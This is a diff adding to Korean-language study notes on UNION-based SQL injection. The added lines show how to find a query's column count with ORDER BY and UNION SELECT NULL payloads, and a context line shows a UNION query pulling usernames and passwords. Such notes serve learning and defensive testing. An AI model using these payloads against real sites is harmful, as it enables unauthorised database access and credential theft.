@@ -152,3 +152,20 @@ SELECT title, content FROM products WHERE id = '1' UNION SELECT username, passwo
 **실행흐름**
 1. 컬럼 개수 찾기\
 가장 많이 쓰이는 방법은 `ORDER BY` 임
+```
+' ORDER BY 1 -- -
+' ORDER BY 2 -- -
+' ORDER BY 3 -- -
+' ORDER BY 4 -- -
+```
+`ORDER BY 3` 까지는 정상적으로 동작하고 `ORDER BY 4`에서 에러가 나면 -> **컬럼은 3개**라는 뜻임\
+
+다른 방법으로는 `UNION SELECT NULL` 을 하나씩 늘려가며 확인
+```
+' UNION SELECT NULL -- -
+' UNION SELECT NULL, NULL -- -
+' UNION SELECT NULL, NULL, NULL -- -
+```
+에러가 나지 않는 시점이 컬럼 개수임.
+또는 `UNION SELECT NULL, 1, NULL`
+
